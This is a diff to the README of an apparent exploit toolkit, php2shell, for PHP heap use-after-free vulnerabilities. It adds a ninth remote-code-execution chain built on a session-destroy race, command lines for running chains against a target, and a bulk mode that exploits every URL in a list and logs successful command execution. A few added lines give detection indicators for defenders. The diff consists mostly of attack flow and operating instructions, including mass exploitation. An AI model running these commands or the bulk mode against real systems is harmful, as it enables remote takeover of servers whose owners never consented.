@@ -21,7 +21,7 @@ Proof-of-concept exploit and isolated lab environment for two critical heap use-
 
 - [Background](#background)
 - [Technical Analysis](#technical-analysis)
-- [8-Chain Architecture](#8-chain-architecture)
+- [9-Chain Architecture](#9-chain-architecture)
 - [Repository Structure](#repository-structure)
 - [Quick Start](#quick-start)
 - [Lab Environment](#lab-environment)
@@ -58,9 +58,9 @@ A second use-after-free exists in PHP's SAPI-level multipart parser, independent
 
 ---
 
-## 8-Chain Architecture
+## 9-Chain Architecture
 
-The v4.0 exploit implements **8 independent RCE chains**, each exploiting different conditions. This multi-vector approach maximizes success rate across diverse target configurations.
+The v4.1 exploit implements **9 independent RCE chains**, each exploiting different conditions. This multi-vector approach maximizes success rate across diverse target configurations.
 
 | Chain | Name | Requirements | LFI Needed | Reliability |
 |---|---|---|---|---|
@@ -72,37 +72,42 @@ The v4.0 exploit implements **8 independent RCE chains**, each exploiting differ
 | **6** | PEARCMD.php | `pearcmd.php` + `register_argc_argv=On` + LFI | Yes | Medium |
 | **7** | /proc/self/environ | Linux `/proc` readable + LFI | Yes | Medium |
 | **8** | PHP Wrappers | `allow_url_include=On` + LFI | Yes | High |
+| **9** | UAF Disturbance Race | `upload_progress=On` + session pages | Optional | Low |
 
 ### Auto-Exploit Flow
 
 ```
-┌─────────────┐
-│   1. Recon   │──► PHP version, OS, session config, phpinfo, allow_url_include
-└──────┬──────┘
-       ▼
-┌─────────────┐
-│ 2. Framework │──► Laravel, Symfony, WordPress, Monolog, Guzzle, CodeIgniter, Yii
-│   Detection  │
-└──────┬──────┘
-       ▼
-┌─────────────┐
-│ 3. Chain 2   │──► Deserialization (no LFI needed, tries all gadgets)
-│  Deser Try   │
-└──────┬──────┘
-       ▼
-┌─────────────┐
-│ 4. LFI Scan  │──► 3-phase: Crawl → Alive Check → LFI Test
-└──────┬──────┘
-       ▼
-┌─────────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
-│ 5. Chain 1   │──►│ Chain 5  │──►│ Chain 7  │──►│ Chain 6  │
-│ Session+LFI  │   │Log Poison│   │ environ  │   │ PEARCMD  │
-└──────┬──────┘    └────┬────┘    └────┬────┘    └────┬────┘
-       ▼                ▼              ▼              ▼
-┌─────────────┐    ┌─────────┐    ┌─────────┐
-│ 6. Chain 8   │──►│ Chain 4  │──►│ Chain 3  │──► Done
-│  Wrappers    │   │phpinfo() │   │/proc/fd  │
-└─────────────┘    └─────────┘    └─────────┘
+┌──────────────────┐
+│  0. Session Fix  │──► Check if server accepts arbitrary session IDs
+└───────┬──────────┘
+        ▼
+┌──────────────────┐
+│   1. Recon       │──► PHP version, OS, session config, phpinfo, allow_url_include
+└───────┬──────────┘
+        ▼
+┌──────────────────┐
+│ 2. Framework     │──► Laravel, Symfony, WordPress, Monolog, Guzzle, CodeIgniter, Yii
+│    Detection     │
+└───────┬──────────┘
+        ▼
+┌──────────────────┐
+│ 3. Chain 2       │──► Deserialization (no LFI needed, tries all gadgets)
+│    Deser Try     │
+└───────┬──────────┘
+        ▼
+┌──────────────────┐
+│ 4. LFI Scan      │──► 3-phase: Crawl → Alive Check → LFI Test
+└───────┬──────────┘
+        ▼
+┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐
+│ Chain 1   │─►│ Chain 9   │─►│ Chain 5   │─►│ Chain 7   │─►│ Chain 6   │
+│Session+LFI│  │UAF Disturb│  │Log Poison │  │ environ   │  │ PEARCMD   │
+└─────┬────┘  └─────┬────┘  └─────┬────┘  └─────┬────┘  └─────┬────┘
+      ▼             ▼             ▼             ▼             ▼
+┌──────────┐  ┌──────────┐  ┌──────────┐
+│ Chain 8   │─►│ Chain 4   │─►│ Chain 3   │──► Done
+│ Wrappers  │  │phpinfo()  │  │/proc/fd   │
+└──────────┘  └──────────┘  └──────────┘
 ```
 
 ### Deserialization Gadgets
@@ -212,7 +217,7 @@ session.use_only_cookies = 0            # Allow session ID from cookies
 ### Full Auto Mode (Default)
 
 ```bash
-# Auto scan + exploit using all 8 chains
+# Auto scan + exploit using all 9 chains
 python3 exploit/php2shell.py -t http://target -c "id"
 ```
 
@@ -223,6 +228,7 @@ python3 exploit/php2shell.py -t http://target -c "id"
 python3 exploit/php2shell.py -t http://target --chain 1 -c "id"   # Session Poisoning
 python3 exploit/php2shell.py -t http://target --chain 2 -c "id"   # Deserialization
 python3 exploit/php2shell.py -t http://target --chain 5 -c "id"   # Log Poisoning
+python3 exploit/php2shell.py -t http://target --chain 9 -c "id"   # UAF Disturbance
 ```
 
 ### Interactive Shell
@@ -283,6 +289,23 @@ python3 exploit/php2shell.py -t http://target \
 python3 exploit/php2shell.py -t http://target -c "id" --proxy http://127.0.0.1:8081
 ```
 
+### Bulk Scan Mode
+
+Scan multiple targets from a file. Outputs JSONL with per-target verdicts:
+
+```bash
+# Create target list
+echo -e "http://target1\nhttp://target2\nhttp://target3" > urls.txt
+
+# Scan all targets (check only, no RCE)
+python3 exploit/php2shell.py --targets urls.txt
+
+# Scan and attempt exploitation
+python3 exploit/php2shell.py --targets urls.txt -c "id" -o results.jsonl
+```
+
+Verdicts: `unreachable`, `no_vector`, `session_fixation`, `armed`, `armed_no_rce`, `rce_hit`, `error`
+
 ---
 
 ## Chain Details
@@ -341,6 +364,27 @@ Injects PHP code via `User-Agent` header and includes `/proc/self/environ` via L
 Uses `php://input` or `data://` wrappers for direct code execution through the LFI vulnerability. Sends the PHP payload in the POST body or as a base64-encoded data URI.
 
 **Requirements:** `allow_url_include=On` + LFI.
+
+### Chain 9 — UAF Disturbance Race
+
+Exploits the core CVE-2026-109618 mechanism directly: sends throttled multipart uploads to keep `session.upload_progress` active while concurrent requests disturb the session via destroy, regenerate, or garbage collection. This races against the session handler to trigger the heap UAF on dangling `zval` pointers.
+
+```
+Thread A: POST multipart (throttled upload, keeps progress tracking active)
+Thread B: GET ?action=destroy  (frees session HashTable while A holds pointers)
+Thread C: GET ?action=regenerate (reallocates session storage)
+Thread D: GET ?action=gc (forces garbage collection)
+    → zval pointers in progress HashTable become dangling → UAF → crash/RCE
+```
+
+Three disturbance modes are tried sequentially:
+- **destroy** — concurrent `session_destroy()` frees the session HashTable
+- **regenerate** — `session_regenerate_id()` reallocates session storage
+- **gc** — force session garbage collection with low `gc_maxlifetime`
+
+Technique sourced from `slabbdev/php2shell` race harness and `ikow/php2shell-poc` chain analysis.
+
+**Requirements:** `upload_progress=On` + session-enabled pages. LFI optional (used for post-crash payload delivery).
 
 ---
 
@@ -404,6 +448,8 @@ auditctl -a always,exit -F arch=b64 -S execve -F ppid=$(pgrep -d, php-fpm) -k ph
 - Session files containing `<?php` tags
 - Unusual User-Agent strings containing PHP code
 - Requests to pearcmd.php paths or /proc/ paths
+- Rapid concurrent requests with identical PHPSESSID (UAF disturbance pattern)
+- HTTP 502/503 after multipart POST (FPM worker crash from UAF)
 
 ```bash
 grep -rl '<?php' /var/lib/php/sessions/
@@ -429,7 +475,12 @@ SecRule REQUEST_HEADERS:User-Agent "@contains <?php" \
 - [Brandefense — php2shell Blog](https://brandefense.io/blog/php2shell-php-rce-cve-2026-109618-109619/)
 - [SocRadar — CVE-2026-109618 & 109619](https://socradar.io/blog/php2shell-cve-2026-109618-cve-2026-109619/)
 - [SecurityWeek — Mass Exploitation Looms](https://www.securityweek.com/php2shell-mass-exploitation-looms-for-leaked-critical-php-flaws/)
-- [ikow/php2shell-poc — Analysis & PoC](https://github.com/ikow/php2shell-poc)
+- [ikow/php2shell-poc — 5-chain Analysis & PoC](https://github.com/ikow/php2shell-poc)
+- [murrez/php2shell — Smart 618 scoring & session fixation](https://github.com/murrez/php2shell)
+- [slabbdev/php2shell — Race harness & disturbance modes](https://github.com/slabbdev/php2shell-cve-2026-109618-109619)
+- [0x4148/CVE-2026-109618 — FPM stall PoC](https://github.com/0x4148/CVE-2026-109618-php2shell-lab)
+- [Is4yev/php2shell-poc — Crash framework](https://github.com/Is4yev/php2shell-poc)
+- [eness/php2shell-PoC — zval pointer analysis & WAF rules](https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC)
 - [HackTricks — LFI2RCE via PHP_SESSION_UPLOAD_PROGRESS](https://hacktricks.wiki/en/pentesting-web/file-inclusion/via-php_session_upload_progress.html)
 - [PayloadsAllTheThings — LFI to RCE](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/LFI-to-RCE/)
 - [PHPGGC — PHP Gadget Chains](https://github.com/ambionics/phpggc)
